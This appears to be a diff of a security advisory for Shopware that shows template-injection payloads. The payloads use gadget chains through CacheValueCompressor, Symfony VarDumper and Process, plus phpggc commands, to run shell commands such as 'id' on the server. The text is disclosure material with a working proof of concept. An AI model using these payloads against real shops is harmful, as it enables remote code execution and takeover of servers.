@@ -160,13 +160,14 @@ Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()
 Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system `'id'`
 
 Compressed payload is generated using:
+
 ```
-$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
-{{ ["\\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
+$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' {{ ["\\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
 ```
 
 #### Gadget 2: 
 Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Component\VarDumper\Vardumper::dump()` to invoke system("id"):
+
 ```
 {{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
 {{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length }}
@@ -174,6 +175,7 @@ Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Compo
 
 #### Gadget 3: 
 Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke proc_open("id > /tmp/pwned.txt"):
+
 ```
 {{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}
 ```
@@ -195,13 +197,14 @@ For simplicity, the following proof-of-concept uses the administrator account to
 #### Gadget 1: 
 Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
 Serialized payload generated using the phpggc tool: 
+
 ```
 ./phpggc -b Monolog/RCE8 system 'id'
 ```
 Compressed payload is generated using: 
+
 ```
-$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
-{{ ["\\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
+$ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' {{ ["\\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
 ```
 
 4. In the right-sidebar, click the Show Preview button. Observe that the id shell command is executed successfully:
